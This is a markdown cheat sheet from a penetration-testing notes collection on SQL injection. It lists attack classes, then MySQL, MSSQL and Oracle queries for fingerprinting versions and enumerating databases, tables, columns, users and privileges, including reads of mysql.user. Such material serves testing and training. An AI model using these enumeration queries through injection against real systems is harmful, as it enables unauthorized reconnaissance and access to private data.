<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# SQL Injection
### References

* References
	* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Attack Classes
* **In band**: union-based, error-based
* **Out-of-band**: HTTP request, DNS request, email, file system
* **Inference**: Blind (boolean-based, time-based)

* General SQL Commands (not specific to attacking) - [SQL Guide](Testaments_and_Books/Other/SQL/SQL.md)

## Information Gathering
* Get Version
	* mysql

			@@version
			@@global.version
			version()
	* mssql

			@@version
	* oracle

			version FROM v$instance
			banner FROM v$version WHERE banner LIKE 'oracle%'
			banner FROM gv$version WHERE banner LIKE 'oracle%'
* String Concatenation
	* mysql

			concat('concat', 'enation')
			'concat' 'enation'
	* mssql

			'some' + 'concatenation'
			concat('concat', 'enation')
	* oracle

			'concat' || 'enation'
			concat('concat', 'enation')
* Numeric Functions
	* mysql

			connection_id()
			last_insert_id()
			row_count()
	* mssql

			@@pack_received
			@@rowcount
			@@transcount
	* oracle

			bitand(0, 1)
			bin_to_num(1)
			to_number(1234)
* Show Databases
	* mysql

			SELECT schema_name FROM information_schema.schemata;
			SHOW databases; -- only if the user has SHOW privs
			SHOW schemas; -- only if the user has SHOW privs
			SELECT database();
			SELECT schema();
	* mssql

			SELECT name FROM master..sysdatabases;
			SELECT name FROM sysdatabases;
			SELECT name FROM sys.databases;
			SELECT db_name(); -- supply smallint ID value
			SELECT 1, db_name(1) FROM master..sysdatabases;
	* oracle

			SELECT tablespace_name FROM user_tablespaces;
			SELECT default_tablespace FROM user_users;
			SELECT default_tablespace FROM sys.user_users;
		* each DB must point to an instance
* Show Tables
	* mysql

			SELECT table_schema, table_name FROM information_schema.tables;
			SHOW tables;
			SHOW tables IN employees -- other DB
	* mssql

			SELECT name FROM sysobjects WHERE xtype = 'U';
			SELECT name FROM employees..sysobjects WHERE xtype = 'U'; -- specific db
			SELECT table_name FROM information_schema.tables;
			SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';
			SELECT table_name FROM employees.information_schema.tables; # specific db
			SELECT table_name FROM employees.information_schema.tables WHERE table_type = 'BASE TABLE';
	* oracle

			SELECT table_name, tablespace_name FROM sys.all_tables;
			SELECT table_name, tablespace_name FROM all_tables;

	* oracle constant expression and DUAL table

			SELECT "WAPTx" FROM DUAL;
* Show Columns
	* mysql

			SELECT table_schema, table_name, column_name FROM information_schema.columns;
			SHOW columns FROM departments IN employees; -- - specific table/db
	* mssql

			SELECT name FROM syscolumns;
			SELECT name FROM employees..syscolumns; # specific table
			SELECT column_name FROM information_schema.columns;
			SELECT column_name FROM employees.information_schema.columns;
			SELECT column_name FROM employees.information_schema.columns WHERE table_name = 'salary';
			SELECT column_name FROM sys.all_tab_columns;
			SELECT column_name FROM all_tab_columns;
	* mssql xtype object types

			S = System table
			U = User table
			TT = Table type
			X = Extended Stored Procedure
			V = Views
* User Functions
	* mysql

			user()
			current_user()
			system_user()
			session_user()
			current_user
			SELECT user FROM mysql.user -- only if privileged
			SELECT grantee, privilege_type FROM information_schema.user_privileges;
			SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
			SELECT user, select_priv, ..., FROM mysql.user;
			SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE privilege_type = 'SUPER';
			SELECT user FROM mysql.user WHERE super_priv = 'Y';